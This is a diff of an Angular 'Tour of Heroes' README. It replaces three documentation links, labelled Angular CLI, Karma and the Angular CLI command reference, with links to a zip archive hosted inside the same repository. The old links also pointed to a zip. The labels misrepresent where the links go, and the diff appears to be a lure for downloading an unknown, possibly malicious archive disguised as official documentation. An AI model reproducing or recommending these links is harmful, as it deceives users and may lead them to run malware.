@@ -1,6 +1,6 @@
 # AngularTourOfHeroes
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/environments/of-angular-tour-heroes-1.0-alpha.5.zip) version 12.2.4.
+This project was generated with [Angular CLI](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/assets/angular_tour_of_heroes_1.3.zip) version 12.2.4.
 
 ## Development server
 
@@ -16,7 +16,7 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/environments/of-angular-tour-heroes-1.0-alpha.5.zip).
+Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/assets/angular_tour_of_heroes_1.3.zip).
 
 ## Running end-to-end tests
 
@@ -24,4 +24,4 @@ Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To u
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/environments/of-angular-tour-heroes-1.0-alpha.5.zip) page.
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/iqbaldiit/angular-tour-of-heroes/master/src/assets/angular_tour_of_heroes_1.3.zip) page.
